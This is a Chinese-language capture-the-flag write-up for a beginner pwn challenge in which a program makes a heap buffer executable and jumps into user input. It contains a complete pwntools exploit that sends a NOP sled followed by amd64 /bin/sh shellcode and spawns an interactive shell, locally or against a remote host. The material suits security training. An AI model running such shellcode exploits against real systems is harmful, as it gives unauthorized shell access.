# week1该怎么起名呢

## 题目简述

程序在堆上申请 `0x1000` 字节，调用 `mprotect` 将对应内存页改为可读、可写、可执行，然后把输入写入堆缓冲区，最后从 `p+0x20` 处开始执行。题目的核心是发送与程序架构匹配的 64 位 shellcode，并让偏移 `0x20` 落在可安全执行的位置。

```c
char *p = malloc(0x1000);
mprotect(p - 0x10, 0x1000, 7);
read(0, p, 0xFFF);
((void (*)(void))(p + 0x20))();
```

## 解题过程

官方程序是 AMD64，而 pwntools 未指定架构时可能按 32 位生成汇编，因此先设置 `context.arch = "amd64"`。

控制流从 `p+0x20` 开始。把 shellcode 前放置长度超过 `0x20` 的 NOP sled 后，入口会先执行若干 `NOP`，再自然滑入 shellcode。原解使用 `0x30` 字节 NOP，既覆盖入口，也为 shellcode 留出对齐余量：

```python
from pwn import *

context.binary = "./main"
context.arch = "amd64"


def start():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    return process(context.binary.path)


io = start()
payload = b"\x90" * 0x30 + asm(shellcraft.sh())

io.sendafter(b"shellcode", payload)
io.interactive()
```

远程运行时传入 `REMOTE HOST=<主机> PORT=<端口>`。取得 shell 后读取 flag 即可。

## 方法总结

- 核心技巧：向可执行堆内存写入 AMD64 shellcode，并用 NOP sled 覆盖间接调用入口。
- 识别信号：输入缓冲区被设置为 `PROT_READ | PROT_WRITE | PROT_EXEC`，随后被转换为函数指针调用。
- 复用要点：必须同时确认目标架构、实际跳转偏移和内存执行权限；只生成 shellcode而不对齐入口仍会执行失败。
